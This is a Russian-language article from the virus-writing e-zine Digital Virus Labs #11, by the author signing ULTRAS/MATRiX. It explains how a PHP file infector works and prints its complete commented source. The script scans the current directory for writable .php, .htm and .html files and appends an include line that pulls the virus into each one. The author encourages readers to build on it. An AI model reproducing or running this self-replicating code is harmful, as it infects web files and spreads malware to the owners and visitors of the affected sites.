
 - [Digital Virus Labs #11] - [Page 36] -

 PHP вирусы
 (c) by ULTRAS/MATRiX

     Что такое PHP - Hypertext Preprocessor scripting language

     На данный момент существует только один способ заражения PHP (htm etc.)
 файлов.

     При  запуске  вируса  он  активизуруется и ищет .PHP (и другие интернет
 файлы  в  которых  можно  использовать  PHP  вставки)  и  заражает  их. При
 заражении  в  заражаемый  файл  записывается  не  код  вируса,  а ссылка на
 вирусный  файл  (это  всего одна команда "include", которая "вставляет" код
 вируса в файл при его обработке).

     Так  как  при открытии зараженного файла скрипт-машина PHP обрабатывает
 команду   "include",   код   вируса   считывается   из  указанного  файла и
 выполняется.

     Таким  образом,  код  вируса  присутствует  в  системе  в  единственном
 экземпляре,  а  все зараженные файлы всего-лишь "ссылаются" на него. Но это
 работет только на текущей машине.

     Вот пример PHP вируса (его некомментированная версия находится в
 прилагающемся архиве):

<--------------------------------- CUT HERE -------------------------------->
<?php
// идентификатор PHP файла

$handle=opendir('.');
// открываем текущую диру

while ($file = readdir($handle))
// читаем все файлы и их хэндлы

{ $inf_=true;
  $ext_=false;
// ставим метки

 if ( ($ext_ = strstr ($file, '.php')) || ($ext_ = strstr ($file, '.htm')) || ($ext_ = strstr ($file, '.html')) )
 if ( is_file($file) && is_writeable($file) )
// проверяем расширение файла и его параметры
 {
   $host = fopen($file, "r");
// открываем его на чтение
   $contents = fread ($host, filesize ($file));
// читаем файл
   $sig = strstr ($contents, 'redz.php');
// так, это нашо тело, тело не заражать
   if(!$sig) $inf_=false;
// ставим метку
 }
 if (($inf_==false))
// если не заражено
  {
   $host = fopen($file, "a");
// открываем файл на запись
   fputs($host,"<?php ");
   fputs($host,"include(\"");
   fputs($host,__FILE__);
   fputs($host,"\"); ");
   fputs($host,"?>");
   fclose($host);
   return;
// вставляем команды типа <?php include("полный путь и имя диры\redz.php"); ?>
 }
}
// закрываем директорию
closedir($handle);
?>
<--------------------------------- CUT HERE -------------------------------->

     Я  думаю,  что  этот  примера  возможно поможет вам написать что нибудь
 более интересное и красивое (чем это Г....) :)))

                                                    ULTRAS [MATRiX]

                                                    ultras.home.sk